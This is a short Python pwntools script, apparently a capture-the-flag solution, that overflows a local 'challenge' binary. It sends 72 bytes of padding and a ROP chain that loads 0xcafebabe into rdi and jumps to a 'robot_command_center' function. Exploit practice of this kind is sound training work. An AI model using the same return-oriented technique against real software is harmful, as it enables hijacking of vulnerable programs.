from pwn import *

binary = context.binary = ELF('./challenge', checksec=False)
rop = ROP(binary)

p = process()

command_center = binary.symbols['robot_command_center']
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
num = 0xcafebabe
padding = b'A'*72

payload = padding + p64(pop_rdi) + p64(num) + p64(command_center)

p.sendlineafter(b'ENTER COMMAND INPUT $> ', payload)
print(p.recv())